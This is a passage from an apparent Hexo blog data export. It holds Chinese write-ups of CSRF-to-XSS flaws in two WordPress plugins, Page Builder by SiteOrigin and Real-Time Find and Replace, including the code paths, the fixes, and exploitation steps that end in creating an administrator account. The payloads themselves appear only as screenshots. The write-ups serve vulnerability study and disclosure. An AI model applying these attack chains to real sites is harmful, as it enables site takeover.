data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131914-722ee72e-9a59-1.png\" alt=\"601baa1f13ba0af8c8d6e4426c7eac3e.png\"></p>\n<p>将其中的content字段改为xss payload</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131929-7afc2a56-9a59-1.png\" alt=\"e26acd21aa9b11b8a28a89d88f86c14b.png\"></p>\n<p>生成csrf poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131943-831cce3e-9a59-1.png\" alt=\"857c91104eb61fd5b71f62db54854b97.png\"></p>\n<p>当管理员访问该poc页面时，xss触发</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131957-8bcf5f60-9a59-1.png\" alt=\"cef52538169f1a0787b579875c258868.png\"></p>\n<p>通过xss漏洞，可以构造payload进行进一步的攻击，例如添加一个管理员账号。</p>\n<h2 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h2><p>在新版live-editor.php文件的xss_headers函数中加入了wp_verify_nonce()函数对nonce进行校验</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520132010-939c214c-9a59-1.png\" alt=\"697a9fe96436a57113323029bc56a45e.png\"></p>\n<p>这一措施可以有效的防范csrf漏洞的产生</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Page Builder by SiteOrigin是一个安装量超过100W的WordPress页面生成器插件，该插件可帮助用户使用基于小工具的页面生成器轻松构建响应式页面内容</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131117-5606d4ae-9a58-1.png\" alt=\"5602057ec16c195db947deaeadf92a3f.png\"></p>\n<p>近日wordfence安全人员披露了一个Page Builder by SiteOrigin2.10.15及以下版本中发现的严重安全漏洞：<br>CSRF to XSS。攻击者可以通过诱使WordPress站点管理员单击特制链接以触发该漏洞，成功利用该漏洞可以使攻击者创建一个新的管理员帐户并安装后门程序。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>Page Builder bySiteOrigin插件内置一款实时编辑器，用户可以在观察实时更改的同时更新内容，这使得页面的编辑和设计或发布过程更加流畅。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131144-660a7004-9a58-1.png\" alt=\"73dd0001f9a40c0dd939302755b258dc.png\"></p>\n<p>本次漏洞就是出现在该插件内置的实时编辑器中。</p>\n<p>在编辑文章活页面时点击实时编辑器按钮即可使用此工具</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131344-ad93a0e4-9a58-1.png\" alt=\"7351e25c7ebb5d4f207dbaaeade362ad.png\"></p>\n<p>在实时编辑器中可以实时预览编辑文章、添加小工具、修改页面布局等情况</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131413-be9f0ed2-9a58-1.png\" alt=\"a213103a3a6cb4172e532d67f67f3c2a.png\"></p>\n<p>以添加小工具功能为例，我们可以添加一个自定义HTML模块</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131535-efae288c-9a58-1.png\" alt=\"1c1a291adb947263670f8a86947ca3ad.png\"></p>\n<p>在这个模块中添加一些内容</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131556-fc065b2c-9a58-1.png\" alt=\"472cbcf202a29d59843f46bb489665de.png\"></p>\n<p>完成编辑后，用户的编辑效果可以实时呈现在编辑器浏览页面中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131613-0619741e-9a59-1.png\" alt=\"990a7ad9885c8880cc91cfc27f7fad2f.png\"></p>\n<p>实时编辑器仅提供用户对草稿的编辑与预览。如果需要保存与发布，还需要点击Save Draft按钮</p>\n<p>在了解了Page Builder by SiteOrigin插件的功能之后，再看一下后台是如何实现与如何产生漏洞的</p>\n<p>当用户点击实时编辑器按钮后，会进入上文描述的实时编辑器页面</p>\n<p>此时用户可以对页面进行一些编辑操作，当用户编辑完成后点击已完成按钮后，会向后台发送如下请求：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131629-0f91a3e0-9a59-1.png\" alt=\"82bbe64a16e3ee32ecf978ee845b7167.png\"></p>\n<p>url中p参数代表目前编辑的文章id，siteorigin_panels_live_editor=true代表目前正开启使用实时编辑器，live_editor_panels_data参数值为修改后的页面数据</p>\n<p>可以跟进插件后台看一下代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131642-1776070e-9a59-1.png\" alt=\"68e36c1e7f20d7bae9cf09087a174f8a.png\"></p>\n<p>程序通过is_live_editor来判断是否使用实时编辑器</p>\n<p>我们接下来看一下is_live_editor函数</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131656-1f928516-9a59-1.png\" alt=\"0b4b5b8be223fa7cb5bf47ea4b2b577c.png\"></p>\n<p>is_live_editor函数的作用是检查用户是否在前端的实时编辑器中，当用户提交的请求url中siteorigin_panels_live_editor不为空时，则判断用户正在使用实时编辑器</p>\n<p>接着，程序调用SiteOrigin_Panels_Live_Editor::single()函数包含实时编辑器文件</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131710-2815bdde-9a59-1.png\" alt=\"7dd3f387c593c990ece8059b4464ba0c.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131728-32e65930-9a59-1.png\" alt=\"eb39bfca06d4eae5db39268f5d09d644.png\"></p>\n<p>在SiteOrigin_Panels_Live_Editor类的构造方法中，通过add_action函数将post_metadata函数挂载到get_post_metadata hook上</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131746-3dd956b2-9a59-1.png\" alt=\"bf43da4c2fa9dfad1d0dfb1bd9663950.png\"></p>\n<p>get_{$meta_type}_metadata hook用以处理动态部分$meta_type指定的元数据类型并获取元数据，这里是用来获取挂载的post_metadata函数返回的元数据</p>\n<p>接下来看一下post_metadata函数</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131804-48a1cda4-9a59-1.png\" alt=\"f028fa52603ac0e7de9b9c573a374e80.png\"></p>\n<p>在post_metadata函数中，对访问实时编辑器的用户身份、提交的跟新信息等进行校验，通过校验的数据可以进行后续处理并返回元数据。但post_metadata函数并没有通过校验csrf token来保护提交数据的来源合法性。这将导致csrf漏洞的产生。</p>\n<p>在通过一系列的校验后，程序将live_editor_panels_data参数提交的页面信息进行加工并进行渲染工作。程序使用add_filter(‘the_content’, string $content )实现页面内容加工工作,然后再将其打印到屏幕上</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131819-518c34cc-9a59-1.png\" alt=\"e27d11a730e2ba6beb5a6d4e6c019ca1.png\"></p>\n<p>这里用来加工页面信息的函数是generate_post_content</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131833-59c25ae0-9a59-1.png\" alt=\"a771f883323d14de0ef0cd34ce838962.png\"></p>\n<p>最终，live_editor_panels_data参数中提交的新的页面信息将会被打印到屏幕上</p>\n<p>需要特别注意的是，此插件实施编辑器中有如下代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131846-6194c69a-9a59-1.png\" alt=\"d1d8a87cd2a479746720dd5e8a9cd597.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131858-686a9242-9a59-1.png\" alt=\"7cf98e32bee7a7eb769f09b247cda67c.png\"></p>\n<p>实时编辑器通过header( ‘X-XSS-Protection: 0’);设置X-XSS-Protection响应头以关闭浏览器XSS保护。可见这个插件的实时编辑器页面中允许xss的触发。</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>构造实时编辑提交页面修改的数据包</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131914-722ee72e-9a59-1.png\" alt=\"601baa1f13ba0af8c8d6e4426c7eac3e.png\"></p>\n<p>将其中的content字段改为xss payload</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131929-7afc2a56-9a59-1.png\" alt=\"e26acd21aa9b11b8a28a89d88f86c14b.png\"></p>\n<p>生成csrf poc</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131943-831cce3e-9a59-1.png\" alt=\"857c91104eb61fd5b71f62db54854b97.png\"></p>\n<p>当管理员访问该poc页面时，xss触发</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131957-8bcf5f60-9a59-1.png\" alt=\"cef52538169f1a0787b579875c258868.png\"></p>\n<p>通过xss漏洞，可以构造payload进行进一步的攻击，例如添加一个管理员账号。</p>\n<h2 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h2><p>在新版live-editor.php文件的xss_headers函数中加入了wp_verify_nonce()函数对nonce进行校验</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520132010-939c214c-9a59-1.png\" alt=\"697a9fe96436a57113323029bc56a45e.png\"></p>\n<p>这一措施可以有效的防范csrf漏洞的产生</p>\n"},{"title":"WordPress Real-Time Find and Replace插件CSRF to Stored XSS漏洞分析","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/SDP下一代的企业访问控制方法.jpg","date":"2020-05-13T09:20:12.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n前言\n----\n\nReal-Time Find and Replace是一个可以实时查找和替换WordPress网页数据的插件。据统计，该漏洞已安装在100,000多个站点上。\n\n近日Real-Time Find and Replace 3.9版本被披露存在一处高度严重的安全问题：由于Real-Time Find andReplace的核心功能模块并没有采用随机数来校验请求的合法性，从而导致跨站点请求伪造（CSRF）漏洞的产生。攻击者可以利用此漏洞，使用恶意代码替换目标站点页面上的任何内容。\n\n漏洞分析\n--------\n\n### 预备知识\n\n这一部分是对本次漏洞分析过程中涉及到的WordPress一些函数与机制的介绍，如果对WordPress很了解可以直接跳过\n\n#### Real-Time Find and Replace插件是如何注册的\n\n首先分析下Real-Time Find and Replace插件是如何注册到wordpress的菜单栏中的，以及WordPress是如何调用该插件\n\nreal-time-find-and-replace插件代码很少，只有一个php文件real-time-find-and-replace.php\n\n首先看wp-content\\\\plugins\\\\real-time-find-and-replace\\\\real-time-find-and-replace.php 17行处的far_add_pages方法，该方法中使用add_submenu_page方法对wordpress的顶级菜单添加子菜单\n\n![a7c7059870cfb1d648bc0bb65436a0e4.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164531-f3045c08-8abe-1.png)\n\nadd_submenu_page方法的参数说明如下\n\n![bbf929c1d7c8d3c0d60c8e4170c3319f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164548-fd754fb2-8abe-1.png)\n\nparent_slug- 父菜单的子名称（或标准WordPress管理页面的文件名）\npage_title- 选择菜单后在页面标题标签中显示的文本\nmenu_title- 菜单中使用的文本\ncapability- 向用户显示此菜单所需的功能\nmenu_slug- 别名，用于引用此菜单\nfunction- 用于输出此页面内容的函数\n\n这里重点看下parent_slug参数和function参数\n\n![7b72b94b45d31844c223a48c831460cf.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164607-08b7170c-8abf-1.png)\n\nparent_slug参数值为tools.php 因此这里是在工具菜单栏处添加此子菜单\n\n![ca6773d2b4c3d18c8ff498daaf4fb49e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164625-136c81d2-8abf-1.png)\n\n从后台页面显示结果来看，的确如此\n\n除此之外，通过parent_slug参数，可以在如下不同位置添加子菜单\n1、在仪表盘菜单处: add_submenu_page( 'index.php', … );\n2、在文章菜单处: add_submenu_page( 'edit.php', … );\n3、在媒体菜单处: add_submenu_page( 'upload.php', … );\n4、在链接菜单处: add_submenu_page( 'link-manager.php', … );\n5、在页面菜单处: add_submenu_page( 'edit.php?post_type=page', … );\n6、在评论菜单处: add_submenu_page( 'edit-comments.php', … );\n7、在自定义文章类型菜单处: add_submenu_page('edit.php?post_type=your_post_type',…)\n8、在外观菜单处: add_submenu_page( 'themes.php', … );\n9、在插件菜单处: add_submenu_page( 'plugins.php', … );\n10、在用户菜单处: add_submenu_page( 'users.php', … );\n11、在工具菜单处: add_submenu_page( 'tools.php', … );\n12、在设置菜单处: add_submenu_page( 'options-general.php', … );\n\n接着来看add_submenu_page方法的function参数：\n\nfunction参数指定用于输出此页面内容的函数。这里指定的是far_options_page，也就是要用far_options_page来输出页面信息\n\n关于add_submenu_page方法需要了解的就这么多，继续往下看\n\n![72da527a711d6c435a6714f6a7e007ba.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164647-2070a782-8abf-1.png)\n\n可见19行有一处add_action( \"admin_print_scripts-\\$page\", 'far_admin_scripts');代码\n接下来介绍下add_action的首参，admin_print_scripts-\\$page是什么\n\\$page是add_submenu_page方法的返回值，add_submenu_page方法在添加子菜单成功后，会将子菜单的对应页面的page_hook作为返回值返回\n\n![757f1f960384127672baf4b7e2147074.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164704-2a7cbbd0-8abf-1.png)\n\n这里的\\$page值为tools_page_real-time-find-and-replace。使用add_submenu_page方法注册的子菜单page_hook都是唯一的，程序也是通过这个值来区分我们注册的不同页面\n\n如果想理解admin_print_scripts-(page_hook)，不妨先看看和它很相似的admin_print_script方法：\n\nadmin_print_scripts方法用来给WordPress后台页面引入js与css文件。使用这个钩子会在所有WordPress后台页面中引入js与css文件。\n\n实际操作中往往不需要在WordPress后台所有页面中加载同一组js与css文件，而是在指定页面中引入指定的js或css文件，这里就需要使用admin_print_scripts-(page_hook)方法。\n\nadmin_print_scripts-(page_hook)方法中的page_hook部分指定了需要加载js或css文件的页面。在这个插件代码中，通过add_action(\"admin_print_scripts-\\$page\", 'far_admin_scripts'\n);在admin_print_scripts-tools_page_real-time-find-and-replace页面中加载far_admin_scripts函数，而far_admin_scripts函数中指定了要引入的js与css文件，见下图\n\n![905f66c00b87f1a6ef28bf05c68dc57a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164719-33638274-8abf-1.png)\n\n引入的这些js与css文件，将在add_submenu_page方法function参数渲染生成页面时生效。\n\n在弄清楚插件是如何注册后，通过访问工具菜单栏中的real-time-find-and-replace子菜单，即可进入存在漏洞的页面，该页面即为far_options_page函数加载far_admin_scripts函数中引入的js与css文件后所渲染的结果\n\n![d88fef128adca1bf8e50571a515b22f8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164734-3c5dee8c-8abf-1.png)\n\n#### Real-Time Find and Replace插件是如何工作的\n\n这一部分比较有意思。在看代码之前，通过Real-Time Find and Replace插件的介绍来看，这个插件可以实时查找和替换网站页面中的数据。但这一点是如何做到的呢？我一度以为这个插件可以遍历读取所有的页面文件，对文件内容直接进行搜索与替换，但这样实现未免太繁琐了。\n\n跟踪代码可以发现，实际的实现很巧妙。\nwp-content\\\\plugins\\\\real-time-find-and-replace\\\\real-time-find-and-replace.php中可看到下列代码\n\n![26bc22727d784d8be2f85d642f5ef4ac.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164748-44eb0e0e-8abf-1.png)\n\n在real-time-find-and-replace.php文件代码的最后一行，通过add_action将far_template_redirect函数连接到template_redirect钩子上。template_redirect钩子将会在显示所请求页面的模板文件前执行，以便插件改写对模板文件的选择。\n\n接着看下far_template_redirect函数\n\n![9bdb6ec554c9201d061921dcc47d1a49.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164803-4de5b928-8abf-1.png)\n\nfar_template_redirect中使用ob_start函数打开输出缓冲区，将所请求页面的模板文件信息保存在输出缓冲区中,并使用far_ob_call函数处理输出结果。\n\nfar_ob_call函数对所请求页面的模板文件内容进行搜索与替换\n\n![f8378a24d0122989baa092ab5476883a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164817-561c5688-8abf-1.png)\n\n因此最终输出的页面中内容被修改，但是页面文件自身并不会被修改\n\n### 进入正题\n\n通过预备知识部分可知real-time-find-and-replace插件是如何在工具菜单注册的子菜单、页面是如何渲染和以及如何工作的。与预备知识相比之下，本次漏洞就显得比较简单\n\n本次漏洞就出在了real-time-find-and-replace插件管理页面，该页面提供了wordpress页面全局搜索与替换的功能\n\n![b604e176acd9407f201e540c7bf1d022.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164838-62a85690-8abf-1.png)\n\n执行完毕之后，wordpress中所有\\<head\\>在输出时将会被替换\n\n![09035470d5a809820349ff1442060920.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164852-6a9cec4e-8abf-1.png)\n\n从下图代码可见替换后的结果\n\n![13c1b3baeadfb1ab8ddff270113f18ec.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164904-72304adc-8abf-1.png)\n\n这个功能虽然很强大，但正常情况下也只有管理员才可以使用这个功能\n\n我们抓一个替换操作的数据包来分析下\n\n![4f03d99860e03e628e393768df90fd7e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164917-79ce011c-8abf-1.png)\n\nPost提交的数据中仅仅包含替换相关的属性值，并没有csrf token\n\n![d0c3f27ffc8ef673e2b297882cea5873.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164933-8352a3be-8abf-1.png)\n\n从上图代码中也可以看到，这个功能并没有校验csrf token。攻击者可以伪造连接诱骗管理员点击，通过csrf攻击使管理员发送请求使用real-time-find-and-replace插件提供的功能，用新内容或恶意代码替换网站上的任何页面信息。当攻击成功后，浏览任意页面均可受到攻击。\n\n总结\n----\n\n开发者一个小小的疏忽，往往会导致很严重的后果。漏洞成因很简单，但是影响还是比较严重的。","source":"_posts/WordPress-Real-Time.md","raw":"---\ntitle: WordPress Real-Time Find and Replace插件CSRF to Stored XSS漏洞分析\ntags: web漏洞分析\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/SDP下一代的企业访问控制方法.jpg\ndate: 2020-05-13 17:20:12\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n前言\n----\n\nReal-Time Find and Replace是一个可以实时查找和替换WordPress网页数据的插件。据统计，该漏洞已安装在100,000多个站点上。\n\n近日Real-Time Find and Replace 3.9版本被披露存在一处高度严重的安全问题：由于Real-Time Find andReplace的核心功能模块并没有采用随机数来校验请求的合法性，从而导致跨站点请求伪造（CSRF）漏洞的产生。攻击者可以利用此漏洞，使用恶意代码替换目标站点页面上的任何内容。\n\n漏洞分析\n--------\n\n### 预备知识\n\n这一部分是对本次漏洞分析过程中涉及到的WordPress一些函数与机制的介绍，如果对WordPress很了解可以直接跳过\n\n#### Real-Time Find and Replace插件是如何注册的\n\n首先分析下Real-Time Find and Replace插件是如何注册到wordpress的菜单栏中的，以及WordPress是如何调用该插件\n\nreal-time-find-and-replace插件代码很少，只有一个php文件real-time-find-and-replace.php\n\n首先看wp-content\\\\plugins\\\\real-time-find-and-replace\\\\real-time-find-and-replace.php 17行处的far_add_pages方法，该方法中使用add_submenu_page方法对wordpress的顶级菜单添加子菜单\n\n![a7c7059870cfb1d648bc0bb65436a0e4.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164531-f3045c08-8abe-1.png)\n\nadd_submenu_page方法的参数说明如下\n\n![bbf929c1d7c8d3c0d60c8e4170c3319f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164548-fd754fb2-8abe-1.png)\n\nparent_slug- 父菜单的子名称（或标准WordPress管理页面的文件名）\npage_title- 选择菜单后在页面标题标签中显示的文本\nmenu_title- 菜单中使用的文本\ncapability- 向用户显示此菜单所需的功能\nmenu_slug- 别名，用于引用此菜单\nfunction- 用于输出此页面内容的函数\n\n这里重点看下parent_slug参数和function参数\n\n![7b72b94b45d31844c223a48c831460cf.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164607-08b7170c-8abf-1.png)\n\nparent_slug参数值为tools.php 因此这里是在工具菜单栏处添加此子菜单\n\n![ca6773d2b4c3d18c8ff498daaf4fb49e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164625-136c81d2-8abf-1.png)\n\n从后台页面显示结果来看，的确如此\n\n除此之外，通过parent_slug参数，可以在如下不同位置添加子菜单\n1、在仪表盘菜单处: add_submenu_page( 'index.php', … );\n2、在文章菜单处: add_submenu_page( 'edit.php', … );\n3、在媒体菜单处: add_submenu_page( 'upload.php', … );\n4、在链接菜单处: add_submenu_page( 'link-manager.php', … );\n5、在页面菜单处: add_submenu_page( 'edit.php?post_type=page', … );\n6、在评论菜单处: add_submenu_page( 'edit-comments.php', … );\n7、在自定义文章类型菜单处: add_submenu_page('edit.php?post_type=your_post_type',…)\n8、在外观菜单处: add_submenu_page( 'themes.php', … );\n9、在插件菜单处: add_submenu_page( 'plugins.php', … );\n10、在用户菜单处: add_submenu_page( 'users.php', … );\n11、在工具菜单处: add_submenu_page( 'tools.php', … );\n12、在设置菜单处: add_submenu_page( 'options-general.php', … );\n\n接着来看add_submenu_page方法的function参数：\n\nfunction参数指定用于输出此页面内容的函数。这里指定的是far_options_page，也就是要用far_options_page来输出页面信息\n\n关于add_submenu_page方法需要了解的就这么多，继续往下看\n\n![72da527a711d6c435a6714f6a7e007ba.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164647-2070a782-8abf-1.png)\n\n可见19行有一处add_action( \"admin_print_scripts-\\$page\", 'far_admin_scripts');代码\n接下来介绍下add_action的首参，admin_print_scripts-\\$page是什么\n\\$page是add_submenu_page方法的返回值，add_submenu_page方法在添加子菜单成功后，会将子菜单的对应页面的page_hook作为返回值返回\n\n![757f1f960384127672baf4b7e2147074.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164704-2a7cbbd0-8abf-1.png)\n\n这里的\\$page值为tools_page_real-time-find-and-replace。使用add_submenu_page方法注册的子菜单page_hook都是唯一的，程序也是通过这个值来区分我们注册的不同页面\n\n如果想理解admin_print_scripts-(page_hook)，不妨先看看和它很相似的admin_print_script方法：\n\nadmin_print_scripts方法用来给WordPress后台页面引入js与css文件。使用这个钩子会在所有WordPress后台页面中引入js与css文件。\n\n实际操作中往往不需要在WordPress后台所有页面中加载同一组js与css文件，而是在指定页面中引入指定的js或css文件，这里就需要使用admin_print_scripts-(page_hook)方法。\n\nadmin_print_scripts-(page_hook)方法中的page_hook部分指定了需要加载js或css文件的页面。在这个插件代码中，通过add_action(\"admin_print_scripts-\\$page\", 'far_admin_scripts'\n);在admin_print_scripts-tools_page_real-time-find-and-replace页面中加载far_admin_scripts函数，而far_admin_scripts函数中指定了要引入的js与css文件，见下图\n\n![905f66c00b87f1a6ef28bf05c68dc57a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164719-33638274-8abf-1.png)\n\n引入的这些js与css文件，将在add_submenu_page方法function参数渲染生成页面时生效。\n\n在弄清楚插件是如何注册后，通过访问工具菜单栏中的real-time-find-and-replace子菜单，即可进入存在漏洞的页面，该页面即为far_options_page函数加载far_admin_scripts函数中引入的js与css文件后所渲染的结果\n\n![d88fef128adca1bf8e50571a515b22f8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164734-3c5dee8c-8abf-1.png)\n\n#### Real-Time Find and Replace插件是如何工作的\n\n这一部分比较有意思。在看代码之前，通过Real-Time Find and Replace插件的介绍来看，这个插件可以实时查找和替换网站页面中的数据。但这一点是如何做到的呢？我一度以为这个插件可以遍历读取所有的页面文件，对文件内容直接进行搜索与替换，但这样实现未免太繁琐了。\n\n跟踪代码可以发现，实际的实现很巧妙。\nwp-content\\\\plugins\\\\real-time-find-and-replace\\\\real-time-find-and-replace.php中可看到下列代码\n\n![26bc22727d784d8be2f85d642f5ef4ac.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164748-44eb0e0e-8abf-1.png)\n\n在real-time-find-and-replace.php文件代码的最后一行，通过add_action将far_template_redirect函数连接到template_redirect钩子上。template_redirect钩子将会在显示所请求页面的模板文件前执行，以便插件改写对模板文件的选择。\n\n接着看下far_template_redirect函数\n\n![9bdb6ec554c9201d061921dcc47d1a49.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164803-4de5b928-8abf-1.png)\n\nfar_template_redirect中使用ob_start函数打开输出缓冲区，将所请求页面的模板文件信息保存在输出缓冲区中,并使用far_ob_call函数处理输出结果。\n\nfar_ob_call函数对所请求页面的模板文件内容进行搜索与替换\n\n![f8378a24d0122989baa092ab5476883a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164817-561c5688-8abf-1.png)\n\n因此最终输出的页面中内容被修改，但是页面文件自身并不会被修改\n\n### 进入正题\n\n通过预备知识部分可知real-time-find-and-replace插件是如何在工具菜单注册的子菜单、页面是如何渲染和以及如何工作的。与预备知识相比之下，本次漏洞就显得比较简单\n\n本次漏洞就出在了real-time-find-and-replace插件管理页面，该页面提供了wordpress页面全局搜索与替换的功能\n\n![b604e176acd9407f201e540c7bf1d022.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164838-62a85690-8abf-1.png)\n\n执行完毕之后，wordpress中所有\\<head\\>在输出时将会被替换\n\n![09035470d5a809820349ff1442060920.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164852-6a9cec4e-8abf-1.png)\n\n从下图代码可见替换后的结果\n\n![13c1b3baeadfb1ab8ddff270113f18ec.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164904-72304adc-8abf-1.png)\n\n这个功能虽然很强大，但正常情况下也只有管理员才可以使用这个功能\n\n我们抓一个替换操作的数据包来分析下\n\n![4f03d99860e03e628e393768df90fd7e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164917-79ce011c-8abf-1.png)\n\nPost提交的数据中仅仅包含替换相关的属性值，并没有csrf token\n\n![d0c3f27ffc8ef673e2b297882cea5873.png](https://xzfile.aliyuncs.com/media/upload/picture/20200430164933-8352a3be-8abf-1.png)\n\n从上图代码中也可以看到，这个功能并没有校验csrf token。攻击者可以伪造连接诱骗管理员点击，通过csrf攻击使管理员发送请求使用real-time-find-and-replace插件提供的功能，用新内容或恶意代码替换网站上的任何页面信息。当攻击成功后，浏览任意页面均可受到攻击。\n\n总结\n----\n\n开发者一个小小的疏忽，往往会导致很严重的后果。漏洞成因很简单，但是影响还是比较严重的。","slug":"WordPress-Real-Time","published":1,"updated":"2020-10-28T01:01:28.117Z","_id":"ckgrozu8x0026wsa904av135n","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Real-Time Find and Replace是一个可以实时查找和替换WordPress网页数据的插件。据统计，该漏洞已安装在100,000多个站点上。</p>\n<p>近日Real-Time Find and Replace 3.9版本被披露存在一处高度严重的安全问题：由于Real-Time Find andReplace的核心功能模块并没有采用随机数来校验请求的合法性，从而导致跨站点请求伪造（CSRF）漏洞的产生。攻击者可以利用此漏洞，使用恶意代码替换目标站点页面上的任何内容。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><h3 id=\"预备知识\"><a href=\"#预备知识\" class=\"headerlink\" title=\"预备知识\"></a>预备知识</h3><p>这一部分是对本次漏洞分析过程中涉及到的WordPress一些函数与机制的介绍，如果对WordPress很了解可以直接跳过</p>\n<h4 id=\"Real-Time-Find-and-Replace插件是如何注册的\"><a href=\"#Real-Time-Find-and-Replace插件是如何注册的\" class=\"headerlink\" title=\"Real-Time Find and Replace插件是如何注册的\"></a>Real-Time Find and Replace插件是如何注册的</h4><p>首先分析下Real-Time Find and Replace插件是如何注册到wordpress的菜单栏中的，以及WordPress是如何调用该插件</p>\n<p>real-time-find-and-replace插件代码很少，只有一个php文件real-time-find-and-replace.php</p>\n<p>首先看wp-content\\plugins\\real-time-find-and-replace\\real-time-find-and-replace.php 17行处的far_add_pages方法，该方法中使用add_submenu_page方法对wordpress的顶级菜单添加子菜单</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164531-f3045c08-8abe-1.png\" alt=\"a7c7059870cfb1d648bc0bb65436a0e4.png\"></p>\n<p>add_submenu_page方法的参数说明如下</p>\n<p><img src= \"/img/loading.gif\" 